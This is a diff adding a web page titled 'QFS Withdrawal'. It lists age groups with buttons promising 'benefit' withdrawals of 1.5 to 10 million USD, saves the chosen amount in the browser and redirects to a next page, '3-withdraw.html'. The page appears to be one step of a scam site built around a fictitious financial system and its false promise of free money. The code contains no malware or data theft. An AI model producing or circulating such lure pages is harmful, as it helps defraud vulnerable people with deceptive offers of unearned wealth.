@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QFS Withdrawal</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        button { padding: 10px; margin: 10px; display: block; width: 250px; }
+    </style>
+</head>
+<body>
+    <h1>QFS Withdrawal</h1>
+    <p>Select your age group to access your benefit:</p>
+
+    <script>
+        let ageGroups = [
+            { age: "18-25", amount: 1500000 },
+            { age: "26-35", amount: 2500000 },
+            { age: "36-45", amount: 4000000 },
+            { age: "46-55", amount: 6000000 },
+            { age: "56-65", amount: 8000000 },
+            { age: "66-70", amount: 9500000 },
+            { age: "70+", amount: 10000000 }
+        ];
+
+        for (let group of ageGroups) {
+            document.write(`<button onclick="proceed(${group.amount})">Withdraw ${group.amount.toLocaleString()} USD (${group.age})</button>`);
+        }
+
+        function proceed(amount) {
+            localStorage.setItem("withdrawAmount", amount);
+            window.location.href = "3-withdraw.html";
+        }
+    </script>
+</body>
+</html>
